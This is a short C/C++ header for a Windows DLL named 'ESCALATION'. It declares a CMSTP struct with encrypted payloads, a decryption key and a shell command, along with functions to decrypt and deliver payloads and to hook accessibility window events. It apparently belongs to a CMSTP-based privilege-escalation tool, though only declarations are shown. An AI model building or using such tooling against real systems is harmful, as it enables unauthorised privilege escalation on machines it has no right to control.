#ifdef ESCALATION_EXPORTS
#define ESCALATION_API __declspec(dllexport)
#else
#define ESCALATION_API __declspec(dllimport)
#endif

ESCALATION_API typedef struct _CMSTP {
	LPCWSTR lpwzEncryptedPayload;
	LPCWSTR lpwzPayloads[3];
	LPCWSTR lpwzKey;
	LPWSTR pzPath;
	LPWSTR pzShellCommand;
	std::string sPayload;
} CMSTP, * PCMSTP;

ESCALATION_API VOID exmDeliverPayload(_In_ LPWSTR lpPayload);
ESCALATION_API VOID exmDecryptPayloads(_In_ PCMSTP p_cmstp);
extern ESCALATION_API int nEventHook;
ESCALATION_API int fnEventHook(void);
ESCALATION_API HWINEVENTHOOK exmInitializeMSAA();
ESCALATION_API HMODULE exmGetThisDllHandle();
ESCALATION_API void exmShutdownMSAA(HWINEVENTHOOK hwekWND);
ESCALATION_API void CALLBACK exmHandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd,
	LONG idObject, LONG idChild,
	DWORD dwEventThread, DWORD dwmsEventTime);